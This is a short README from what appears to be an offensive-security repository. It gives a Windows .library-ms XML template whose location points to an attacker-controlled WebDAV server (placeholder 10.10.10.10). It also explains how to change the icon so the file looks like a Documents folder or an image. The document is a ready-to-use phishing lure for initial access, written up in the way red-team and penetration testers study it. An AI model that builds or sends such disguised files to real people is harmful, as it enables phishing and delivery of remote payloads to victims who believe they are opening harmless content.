# MaliciousMSLibrary

Malicious Library-ms Example Code

This repository contains code for a malicious ms-Library that shows the content of a attacker-controlled WebDAV server.

From the code below, changing *iconReference*  value to -1002 (keeping the same DLL) will change the icon to a Windows Documents folder. 
Actual value (-1003) sets the icon of an Image file icon.

*url* value must be changed to the WebDAV server address.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://10.10.10.10</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

